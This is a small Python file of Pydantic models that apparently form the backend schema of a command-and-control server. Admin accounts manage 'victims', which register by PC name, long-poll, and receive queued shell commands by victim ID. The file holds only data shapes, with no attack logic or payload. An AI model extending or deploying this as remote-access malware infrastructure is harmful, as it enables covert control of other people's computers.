from pydantic import BaseModel


class RegisterAdmin(BaseModel):
    admin_login: str
    admin_hash_password: str
    is_super_admin: bool = False
    is_active: bool = True


class SetActiveAdmin(BaseModel):
    admin_login: str
    is_active: bool


class DeleteAdmin(BaseModel):
    admin_login: str


class AuthAdmin(BaseModel):
    admin_login: str
    admin_hash_password: str


class Victim(BaseModel):
    pc_name: str
    unique_number: str = ""


class RegisterVictim(BaseModel):
    pc_name: str = ""


class LoginVictim(BaseModel):
    unique_number: str = ""


class LongpoolVictim(BaseModel):
    unique_number: str = ""


class Command(BaseModel):
    victim_id: int
    command: str